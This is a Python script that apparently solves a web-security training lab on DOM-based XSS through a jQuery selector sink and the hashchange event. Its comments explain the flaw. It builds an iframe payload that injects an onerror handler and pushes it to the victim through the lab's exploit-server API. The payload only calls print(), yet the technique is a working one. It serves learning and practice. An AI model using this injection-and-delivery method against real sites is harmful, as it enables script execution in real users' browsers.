import argparse
import requests

# DOM XSS in a jQuery selector sink triggered via a hashchange event. The home
# page feeds location.hash into $('section.blog-list h2:contains(' + hash + ')').
# jQuery's $() builds an HTML string as elements, so <img src=1 onerror=print()>
# in the hash creates an img -> onerror fires. hashchange only fires when the hash
# CHANGES, so the exploit loads the page with an empty '#' then appends the payload
# in the iframe's onload, changing the hash on an already-loaded page.
#
# This needs delivery to the victim via the exploit server (print() must run in the
# victim's browser), so the script drives the exploit server's store + deliver API.

parser = argparse.ArgumentParser(description="Solve XSS lab 6 (DOM XSS, jQuery selector sink, hashchange)")
parser.add_argument("exploit_server", help="Exploit server URL (https://exploit-...exploit-server.net)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
args = parser.parse_args()

exploit_server = args.exploit_server.rstrip("/")
lab_url = args.lab_url.rstrip("/")

# iframe loads the home page with an empty '#', then onload appends the payload to
# the src - changing location.hash so hashchange fires and the jQuery sink builds
# the <img>, whose onerror calls print().
poc = f'<iframe src="{lab_url}/#" onload="this.src+=\'<img src=1 onerror=print()>\'"></iframe>'

def exploit_action(form_action):
    return requests.post(exploit_server + "/", data={
        "urlIsHttps": "true",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": poc,
        "formAction": form_action,
    })

print("[*] Storing the hashchange exploit on the exploit server...")
exploit_action("STORE")

print("[*] Delivering the exploit to the victim...")
exploit_action("DELIVER_TO_VICTIM")

if "is-solved" in requests.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print("[!] Delivered. Give the victim a moment and re-check the lab status.")
